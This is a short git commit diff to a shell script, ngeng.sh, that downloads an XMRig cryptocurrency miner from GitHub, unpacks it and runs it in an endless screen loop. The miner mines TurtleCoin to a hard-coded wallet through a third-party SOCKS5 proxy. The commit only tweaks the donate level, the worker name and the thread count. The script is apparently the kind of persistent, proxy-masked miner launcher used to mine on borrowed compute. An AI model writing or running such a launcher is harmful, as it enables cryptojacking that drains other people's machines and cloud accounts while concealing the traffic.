4752cfd73e8cdbe6cc48fcc2cb723d715125f142
Taryok <92034895+Taryok@users.noreply.github.com>
2021-12-22 15:52:07 +0700

    Update ngeng.sh

--- ngeng.sh
+++ ngeng.sh
@@ -6,7 +6,6 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-bioni
 tar -xvf xmrig-6.11.1-bionic-x64.tar.gz
 cd xmrig-6.11.1
 while [ 2 ]; do
-screen ./xmrig --donate-level 20000 -o us.turtlecoin.herominers.com:10381 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+b5a6cb7da918c5679c19d0e5ff6f2d2ed4a4f659a56ca1eb32e4702967463096.$(nproc) -t 36 -p x -a argon2/chukwav2 -k --randomx-1gb-pages --proxy socks5://98.175.31.195:4145
-sleep 3
+screen ./xmrig --donate-level 2 -o us.turtlecoin.herominers.com:10381 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+b5a6cb7da918c5679c19d0e5ff6f2d2ed4a4f659a56ca1eb32e4702967463096.ngeng -t 35 -p x -a argon2/chukwav2 -k --randomx-1gb-pages --proxy socks5://98.175.31.195:4145
 done
 exit
